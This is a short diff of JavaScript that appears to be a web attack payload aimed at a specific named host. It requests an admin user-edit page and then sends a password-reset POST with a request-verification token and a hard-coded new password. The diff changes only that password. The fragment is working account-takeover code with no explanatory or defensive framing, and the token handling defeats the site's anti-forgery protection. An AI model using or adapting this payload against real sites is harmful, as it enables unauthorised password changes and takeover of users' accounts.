@@ -16,6 +16,6 @@ fetch("https://refeng.erad.com/Admin/AdminUsers/Edit?aUserKey=25713")
     fetch("https://refeng.erad.com/Home/PasswordReset", {  
       method: "POST",  
       headers: { "Content-Type": "application/x-www-form-urlencoded" },  
-      body: `__RequestVerificationToken=${encodeURIComponent(token)}&NewPassword=Test@123@12&ConfirmPassword=Test@123@12&returnUrl=%2F`  
+      body: `__RequestVerificationToken=${encodeURIComponent(token)}&NewPassword=Test@123@123&ConfirmPassword=Test@123@123&returnUrl=%2F`  
     });  
   });
